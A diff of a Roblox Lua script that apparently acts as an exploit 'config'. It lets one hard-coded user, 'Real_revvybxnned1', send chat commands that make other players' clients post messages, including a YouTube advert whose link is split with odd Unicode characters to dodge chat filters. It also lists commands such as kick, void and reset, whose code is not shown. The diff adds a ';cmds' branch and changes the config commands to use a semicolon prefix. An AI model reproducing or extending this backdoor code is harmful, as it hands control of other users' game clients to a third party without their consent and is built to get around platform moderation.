@@ -45,6 +45,10 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
    local textChatService = game:GetService("TextChatService")
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
 
+   elseif cmd == ";cmds" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
+
  elseif cmd == ";ad" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target  then
    local textChatService = game:GetService("TextChatService")
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
@@ -53,11 +57,11 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
    local textChatService = game:GetService("TextChatService")
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
 
-   elseif cmd == "config" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
+   elseif cmd == ";config" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
    local textChatService = game:GetService("TextChatService")
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
 
- elseif cmd == "config" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+ elseif cmd == ";config" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
    local textChatService = game:GetService("TextChatService")
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
    
